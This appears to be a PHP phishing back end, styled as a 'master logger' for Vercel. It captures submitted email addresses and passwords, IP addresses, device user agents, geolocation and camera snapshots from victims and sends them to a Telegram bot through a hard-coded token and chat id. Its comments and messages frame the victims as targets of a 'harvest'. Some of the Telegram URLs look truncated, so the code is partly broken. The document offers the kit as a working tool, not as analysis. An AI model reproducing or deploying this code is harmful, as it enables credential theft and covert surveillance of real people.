<?php
// ===================================================
// ALZZc-777 MASTER LOGGER VERCEL EDITION
// ===================================================
$token  = "8919205558:AAFp9N50UVrIFxozxXVhi0BjMcXV8NHwjeI";
$chatid = "6891987044";
// ===================================================

$time = date('d-M-Y H:i:s');
$ip   = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$ua   = $_SERVER['HTTP_USER_AGENT'];

// 1. TANGKAP DATA LOGIN
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    
    $msg = "<b>🔥 PANEN VERCEL! 🔥</b>\n\n";
    $msg .= "<b>📧 Akun :</b> <code>$email</code>\n";
    $msg .= "<b>🔑 Pass :</b> <code>$pass</code>\n";
    $msg .= "<b>🌐 IP   :</b> <code>$ip</code>\n\n";
    $msg .= "<b>📱 Device:</b> <i>$ua</i>";
    
    sendTele($msg);
}

// 2. TANGKAP LOKASI
if (isset($_GET['lat']) && isset($_GET['lon'])) {
    $lat = $_GET['lat']; $lon = $_GET['lon'];
    sendTele("<b>📍 LOKASI TARGET!</b>\nhttps://google.com");
}

// 3. TANGKAP FOTO
if (isset($_POST['img'])) {
    $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $_POST['img']);
    $file = '/tmp/snap_'.time().'.png'; // Vercel butuh folder /tmp
    file_put_contents($file, base64_decode($img));
    sendPhoto($file);
    if (file_exists($file)) { unlink($file); }
}

function sendTele($m) {
    global $token, $chatid;
    $url = "https://telegram.org".urlencode($m)."&parse_mode=html";
    file_get_contents($url);
}

function sendPhoto($f) {
    global $token, $chatid;
    $url = "https://telegram.org";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatid, 'photo' => new CURLFile(realpath($f))]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch); curl_close($ch);
}
?>

